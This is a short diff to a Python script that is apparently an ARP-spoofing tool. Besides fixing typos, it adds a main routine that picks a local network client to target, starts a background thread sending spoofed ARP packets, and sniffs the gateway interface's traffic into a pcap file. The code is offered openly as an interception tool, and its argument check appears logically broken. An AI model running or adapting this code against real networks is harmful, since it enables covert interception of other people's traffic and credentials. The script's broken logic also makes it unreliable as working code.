@@ -47,7 +47,7 @@ def is_gateway(gateway_ip):
     return False
 
 def get_interface_names():
-    # changing directories toget interface names from /sys/class/net
+    # changing directories to get interface names from /sys/class/net
     os.chdir("/sys/class/net")
     interface_names = os.listdir()
     return interface_names
@@ -156,7 +156,7 @@ def print_arp_res(arp_res):
 def get_cmd_arguments():
     """This function validates the command line arguments supplies at the beginning"""
     ip_range = None
-    if lens(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
+    if len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
         print("-ip_range flag not specified.")
         return ip_range
     elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
@@ -196,3 +196,23 @@ gateway_info = gateways[0]
 # Gateways are removed from the clients
 client_info = clients(arp_res, gateways)
 
+#Program will exit if there are no clients
+
+if len(client_info) == 0:
+    print("No clients found when sending the ARP messages.")
+    exit()
+
+choice = print_arp_res(client_info)
+
+# Select the node to spoof from the client_info list.
+node_to_spoof = client_info[choice]
+
+# Setup the thread in the background which will send the arp spoof packets.
+t1 = threading.Thread(target=send_spoof_packets, daemon=True)
+
+t1.start()
+
+os.chdir(cwd)
+
+# Run the packet sniffer on the interface. So we can capture all the packets and save it to a pcap file that can be opened in Wireshark.
+packet_sniffer(gateway_info["iface"])
